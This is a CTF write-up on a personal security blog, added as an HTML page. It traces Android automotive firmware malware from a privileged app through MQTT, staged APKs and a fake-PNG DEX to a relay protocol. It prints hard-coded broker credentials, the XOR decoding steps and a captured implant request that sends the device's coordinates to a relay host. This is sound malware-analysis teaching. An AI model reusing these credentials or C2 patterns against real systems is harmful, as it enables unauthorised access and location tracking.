@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Silent Passenger: Android Firmware and Supply Chain Malware Analysis | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Android automotive firmware and supply chain malware analysis across MQTT, staged APKs, encrypted updates, and a custom relay protocol.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/silent-passenger.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript><style>#theme-toggle,.top-link{display:none}</style></noscript>
+<script>
+if(localStorage.getItem("pref-theme")==="dark"){document.documentElement.dataset.theme="dark"}else if(localStorage.getItem("pref-theme")==="light"){document.documentElement.dataset.theme="light"}else if(window.matchMedia("(prefers-color-scheme: dark)").matches){document.documentElement.dataset.theme="dark"}else{document.documentElement.dataset.theme="light"}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+<meta property="og:url" content="https://jennshaggy.github.io/silent-passenger.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Silent Passenger: Android Firmware and Supply Chain Malware Analysis">
+<meta property="og:description" content="Android automotive firmware and supply chain malware analysis across MQTT, staged APKs, encrypted updates, and a custom relay protocol.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Silent Passenger: Android Firmware and Supply Chain Malware Analysis">
+<meta name="twitter:description" content="Android automotive firmware and supply chain malware analysis across MQTT, staged APKs, encrypted updates, and a custom relay protocol.">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Source+Code+Pro:wght@400;500;600&family=Tomorrow:wght@500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+</head>
+<body id="top">
+<header class="header">
+<nav class="nav">
+<div class="logo">
+<a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+<div class="logo-switches">
+<button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+<svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+</button>
+<button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+</div>
+</div>
+<ul id="menu">
+            <li><a href="/security-defense/" title="Security &amp; Defense"><span>Security &amp; Defense</span></a></li>
+            <li><a href="/networking.html" title="Networking"><span>Networking</span></a></li>
+            <li><a href="/systems-foundation.html" title="Systems"><span>Systems</span></a></li>
+            <li><a href="/penetration-testing.html" title="Penetration Testing"><span class="active">Penetration Testing</span></a></li>
+            <li><a href="/platforms-training.html" title="Training"><span>Training</span></a></li>
+            <li><a href="/ai-security/" title="AI Security"><span>AI Security</span></a></li>
+</ul>
+</nav>
+</header>
+<main class="main">
+<article class="post-single technical-writeup">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">Silent Passenger: Android Firmware and Supply Chain Malware Analysis</h1>
+<div class="post-description">Android automotive firmware and supply chain malware analysis across MQTT, staged APKs, encrypted updates, and a custom relay protocol.</div>
+</header>
+<div class="post-content">
+
+<blockquote>
+<p><strong>CTF spoilers ahead.</strong> Silent Passenger was a Hard Sherlock challenge from Hack The Box's Holmes CTF 2026: The Reichenbach Directive. All systems, infrastructure, identities, and events described here belong to the fictional challenge environment and were not harmed in the slaying of this CTF.</p>
+</blockquote>
+<table>
+<tbody>
+<tr class="odd">
+<td>Event</td>
+<td>Hack The Box Holmes CTF 2026</td>
+</tr>
+<tr class="even">
+<td>Challenge</td>
+<td>Silent Passenger</td>
+</tr>
+<tr class="odd">
+<td>Category</td>
+<td>Sherlock</td>
+</tr>
+<tr class="even">
+<td>Difficulty</td>
+<td>Hard</td>
+</tr>
+<tr class="odd">
+<td>Team</td>
+<td>CIAT Cybersecurity Club</td>
+</tr>
+<tr class="even">
+<td>Recognition</td>
+<td>Team MVP</td>
+</tr>
+</tbody>
+</table>
+<p>Silent Passenger arrived as an Android automotive head unit firmware image. It could have been a neat little APK, but today was not that day. I was not expecting such an exciting novella.</p>
+<p>First things first, evidence preservation. I hashed the archive and firmware files, unpacked the image, and read-only mounted the Android filesystem. In the spirit of protecting my VM's storage, I was the overlord of every extraction. Android firmware expands quickly, and my Kali VM didn't have room for unlimited copies of the massive evidence set.</p>
+<h2 id="firmware-triage">Firmware Triage</h2>
+<p>The mounted image was packed to the brim with system and vendor applications. I checked privileged placement, boot receivers, permissions, signing certificates, cleartext endpoints, and deleted APK candidates.</p>
+<p><code>TDService</code> and the FOTA packages were the first I dug into because their access and network behavior could modify the head unit. Applications were grouped by signing certificate, older APKs were recovered from deleted firmware entries, yet none connected the firmware to the delivery chain.</p>
+<p>Privileged access and cleartext networking can initially seem like suspicious characters. Neither held the secrets of which application delivered the implant.</p>
+<p><code>TWCore</code> swept in to change that. Our unsung anti-hero provided the connection.</p>
+<p>The package was stored here:</p>
+<pre class="text"><code>/system/priv-app/TWCore/TWCore.apk</code></pre>
+<p>I preserved its SHA256 before moving into decompilation:</p>
+<pre class="text"><code>d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2</code></pre>
+<p><code>TWCore</code> launched at boot, accessed location data, and referenced Baidu's trajectory tracking API. The decompiled code collected GPS points, uploaded individual points or batches, and accepted remote collection settings. It received configuration through an MQTT message handler.</p>
+<p>The culprit had been detained.</p>
+<p>All it took was one command to change GPS collection behavior and set the upload destination, and the handler was traced back to the MQTT callback. <code>TWCore</code> listened for both config changes sent to each head unit and commands sent to individual devices.</p>
+<p><code>TWCore</code> tied boot persistence, location collection, remote configuration, and an MQTT control channel together.</p>
+<h2 id="regional-mqtt-configuration">Regional MQTT Configuration</h2>
+<p>The application selected its backend config based on device region using locale and this Android system property:</p>
+<pre class="text"><code>ro.com.google.gmsversion</code></pre>
+<p>The affected branch pointed to the production Cardoor broker:</p>
+<pre class="text"><code>tcp://mqtt.car.cardoor.cn:1883</code></pre>
+<p>The MQTT client used hard coded application credentials:</p>
+<pre class="text"><code>Username: dofun
+Password: dofun666666</code></pre>
+<p><code>TWCore</code> listened for updates on several MQTT channels, including all configuration messages under...</p>
+<pre class="text"><code>dofun/car/config/#</code></pre>
+<p>I used the recovered creds to connect to Cardoor MQTT broker and subscribed to <code>dofun/car/config/#</code>.</p>
+<p>The broker approved the subscription request. They then forwarded an update in the form of an MQTT response with instructions for a missing package in the mounted firmware:</p>
+<pre class="text"><code>Package: com.tw.jar1
+Version: 12
+MD5: 6c2e34b30da42085240ede53ab6107d4</code></pre>
+<p>We now had the package name, version, and MD5 needed to retrieve the next stage.</p>
+<h2 id="reconstructing-the-embedded-stage">Reconstructing the Embedded Stage</h2>
+<p>I downloaded the missing APK and verified its metadata. The APK config was rigged for persistence aka it started when the Android system booted. It then requested permission to access device location and network connection.</p>
+<p>The APK config also included background Android components capable of running tasks and receiving messages. To really make it the complete packaged deal, the APK was not the final payload. It's starring role was loading another executable stage.</p>
+<p>The APK held a chunk of data arranged in a specific format. In other words, a blob. The blob uncovered the loader's class, method, and campaign channel <code>2039</code>:</p>
+<pre class="text"><code>Class: com.c.j.qbh
+Method: wa
+Channel: 2039</code></pre>
+<p>The remaining bytes were reconstructed into another executable Android archive. I saved it as <code>jarservice-stage2.apk</code>, then opened it in JADX.</p>
+<p>During the first decompilation, JADX left out crucial code. I reran the APK with bad code recovery and debug comments. Voila! The missing update logic finally appeared.</p>
+<p>Word to the wise: if a decompiler makes a method body vanish, do not trust its first answer as the final word.</p>
+<p>Stage two introduced itself as version <code>1.7</code> and contacted:</p>
+<pre class="text"><code>/api/rsaUpdate</code></pre>
+<p>The <code>rsaUpdate</code> request sent the user ID, DEX version and type, channel ID, package name, application version, and application name. The server encrypted its response with RSA utilizing keys stored inside the stage.</p>
+<p>Once decrypted, a new path was revealed:</p>
+<pre class="text"><code>/vr34der34/dex3.68.png</code></pre>
+<p>Despite the <code>.png</code> extension, it was probably an encrypted or disguised DEX. The Just Hacking Training Malware Analysis class I'm taking is really upping my game.</p>
+<h2 id="decoding-dex368png">Decoding dex3.68.png</h2>
+<p>Decoding <code>dex3.68.png</code> started with a five byte wrapper. The first byte described the payload type. The next four stored version <code>3.68</code> as a big endian floating point number:</p>
+<pre class="text"><code>Type: 1
+Version: 3.68</code></pre>
+<p>The decoder multiplied the version by 100 yielding <code>368</code>. Its low byte, <code>0x70</code>, became the XOR key for the remaining data. I removed the wrapper, applied the XOR operation, and got valid APK and JAR magic.</p>
+<p>The alleged PNG's cover was blown.</p>
+<p>I saved the decoded output as <code>jarservice-stage3.apk</code> and opened it in JADX. The strings were obfuscated. No problemo. Decoding them revealed the initialization, registration, config, and task routes. The stage requested its live config, then registered through the challenge service.</p>
+<p>Registration gave the implant a new UID:</p>
+<pre class="text"><code>00005bp</code></pre>
+<h2 id="retrieving-the-implant-task">Retrieving the Implant Task</h2>
+<p>The implant used its new UID to request a task. The service responded:</p>
+<pre class="text"><code>Product ID: 4532
+Task ID: 34337681
+Version: 1787907664</code></pre>
+<p>The task pointed to the final module, <code>sh66.io</code>. I downloaded it and recorded its SHA256:</p>
+<pre class="text"><code>906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963</code></pre>
+<p>The control stage loaded <code>com.miyc.transfer.Client.start</code> and passed four integers in this sequence:</p>
+<pre class="text"><code>9999, 7777, 8888, 20000</code></pre>
+<p>The module opened 2 socket connections. The first handled control messages. The second carried data. Direct HTTP requests that seemingly went to the web destination actually went nowhere. The module was not using a normal web route. Fine. I can deal with the smoke and mirrors. I needed to reproduce its socket protocol.</p>
+<h2 id="reproducing-the-relay-protocol">Reproducing the Relay Protocol</h2>
+<p>The control connection introduced itself with a binary registration frame. Splitting its fields gave me the opcode, build number, UID length, and assigned UID:</p>
+<pre class="text"><code>33 00000042 00000007 30303030356270</code></pre>
+<pre class="text"><code>Opcode: 0x33
+Build: 66
+UID length: 7
+UID: 00005bp</code></pre>
+<p>The relay answered with a job instruction and a short token. I sent the token over the paired data connection. One 164 byte HTTP request came back:</p>
+<pre class="http"><code>GET http://198.51.100.7/relay/enroll?relayId=00005bp&amp;role=drone-control&amp;latitude=51.4997000&amp;longitude=-0.1608000 HTTP/1.1
+Host: 198.51.100.7
+Connection: close</code></pre>
+<p>Both connections closed immediately after the request. The internal destination was unreachable through the event VPN. Thankfully, the capture had already given me the relay identity, role, destination, and coordinates.</p>
+<p>The coordinates:</p>
+<pre class="text"><code>51.4997000,-0.1608000</code></pre>
+<h2 id="challenge-completion">Challenge Completion</h2>
+<p>I had already reconstructed most of the malware chain when I realized the unfamiliar HTB interface had tucked twenty questions inside a collapsed panel.</p>
+<p>WTH, Jenn.</p>
+<p>Consider this my written commitment to myself to get on HTB more often.</p>
+<p>My notes were controlled chaos. Thankfully, I document like a lunatic. The hashes, source excerpts, decrypted responses, task values, protocol fields, wrong turns, and corrected interpretations were already there. I used them to answer all twenty questions and complete the scenario.</p>
+<p>Silent Passenger started with a firmware image packed with plausible suspects. Permissions, certificates, and cleartext endpoints gave me places to look. Did they expose the delivery chain? No. Behavior did. <code>TWCore</code> led to MQTT, MQTT delivered the loader, and when pressed, each stage forked over the instructions for the next.</p>
+<p>The final request was hiding behind an APK, an embedded stage, an RSA encrypted response, a fake PNG, a registration flow, a task, and a custom two connection protocol. Say that five times without faltering.</p>
+<p>Somewhere in that automotive firmware, a privileged vendor application was preparing to enroll itself as <code>drone-control</code> (insert dramatic movie trailer music here). The rest is now documented history.</p>
+<img src="/images/holmes-ctf-2026/silent-passenger-complete.png" alt="Silent Passenger completion screen showing Scenario Pwned and 20 of 20 questions completed" class="holmes-writeup-image">
+<p class="holmes-image-caption">Silent Passenger complete with all twenty questions answered.</p>
+
+<p class="holmes-related"><strong>More from Holmes CTF 2026:</strong> <a href="/last-light.html">Last Light</a></p>
+
+</div>
+<footer class="post-footer">
+</footer>
+</article>
+</main>
+<footer class="footer"><span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot; <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a></span></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"></path></svg></a>
+<script>
+let menu=document.getElementById("menu");if(menu){const p=localStorage.getItem("menu-scroll-position");if(p)menu.scrollLeft=parseInt(p,10);menu.onscroll=()=>localStorage.setItem("menu-scroll-position",menu.scrollLeft)}
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener("click",function(e){e.preventDefault();const id=this.getAttribute("href").substring(1);document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:window.matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth"});if(id==="top")history.replaceState(null,null," ");else history.pushState(null,null,`#${id}`)}));
+let topButton=document.getElementById("top-link");window.onscroll=()=>{if(document.body.scrollTop>800||document.documentElement.scrollTop>800){topButton.style.visibility="visible";topButton.style.opacity="1"}else{topButton.style.visibility="hidden";topButton.style.opacity="0"}};
+document.getElementById("theme-toggle").addEventListener("click",()=>{const html=document.documentElement;if(html.dataset.theme==="dark"){html.dataset.theme="light";localStorage.setItem("pref-theme","light")}else{html.dataset.theme="dark";localStorage.setItem("pref-theme","dark")}});
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
